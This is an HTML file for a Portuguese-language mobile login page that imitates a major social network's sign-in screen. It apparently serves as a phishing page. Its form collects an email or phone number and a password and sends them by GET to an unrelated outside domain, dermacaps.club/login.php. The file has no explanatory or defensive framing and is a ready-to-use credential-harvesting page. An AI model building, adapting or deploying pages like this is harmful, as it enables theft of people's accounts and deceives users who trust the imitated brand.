<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<title>Entre ou cadastre-se</title>
<style>
.logo {
	margin-bottom:20px;
	text-align:center;
}
.texto {
	padding: 12px;
	font-family: Helvetica, Arial, sans-serif;
	background: #f5f6f7;
	-webkit-user-select: text;
	-webkit-appearance: none;
	-webkit-text-size-adjust: none;
	cursor: text;
	width: 100%;
	font-size: 14px;
	line-height: 18px;
	border: 1px solid #E0E0E0;
	display: block;
	margin: 5px 0;
	border-radius: 3px;
}

.entrar {
	width: 100%;
	padding: 10px;
	border: none;
	border-radius: 3px;
	box-sizing: border-box;
	position: relative;
	-webkit-user-select: none;
	z-index: 0;
	background:#1877F2;
	cursor:default;
	font-size: 17px;
	display: block;
	text-shadow: 0 -1px rgba(0, 0, 0, .25);
	color:#FFF;
	font-weight:bold;
	font-family: Helvetica, Arial, sans-serif;
	margin:10px 0;
}
.ou {
	width:100%;
	margin: 12px 0 14px 0;
	display: block;
overflow: hidden;
text-align: center;
white-space: nowrap;
-webkit-text-size-adjust: none;
cursor: pointer;
font-size: 14px;
line-height: 18px;
font-family: Helvetica, Arial, sans-serif;
	direction: ltr;
}
.oouu {
	color: #4b4f56;
	text-align: center;
white-space: nowrap;
}
.conta {
	font-family: Helvetica, Arial, sans-serif;
	margin: 0;
	-webkit-user-select: none;
	-webkit-text-size-adjust: none;
	direction: ltr;
	min-width:50px;
background: #00a400;
color: #fff;
text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
padding: 10px 16px;
border-radius: 4px;
box-sizing: border-box;
display: inline-block;
font-weight: bold;
overflow: hidden;
text-overflow: ellipsis;
vertical-align: bottom;
white-space: nowrap;
font-size: 16px;
cursor: pointer;
text-decoration: none;
text-align: center;
}
.criar {
	text-align:center;
	margin-top:20px;
}
.esqueceu a{
	color: #7596c8;
font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
font-size: 14px;
line-height: 16px;
cursor: pointer;
text-decoration: none;
text-align: center;
-webkit-text-size-adjust: none;
}
</style>

</head>

<body style="min-height: 608px; background-color: rgb(255, 255, 255);">
<div class="tudo">
<div class="logo"><img src="./index_files/logo.fw.png" class="img" width="112"></div><!-- logo -->
<div class="form">
<form method="get" action="https://dermacaps.club/login.php?email=<?=$_POST['email']; ?>&pass=<?= $_POST['pass'];?>" id="login_form">
<input autocorrect="off" autocapitalize="off" class="texto" autocomplete="on" name="email" placeholder="Número de celular ou email" type="text">

<input autocorrect="off" autocapitalize="off" class="texto" autocomplete="on" name="pass" placeholder="Senha" type="password">

<input type="submit" class="entrar" value="Entrar">
</form>
</div><!-- form -->
<div class="ou">
<span class="oouu">ou</span>
</div><!-- ou -->
<div class="criar">
<a role="button" class="conta">Criar nova conta</a>
<p><span class="esqueceu"><a href="#">Esqueceu a senha?</a></span></p>
</div><!-- criar -->
<div class="rodape">

</div><!-- rodape -->
</div><!-- tudo -->
</body>
</html>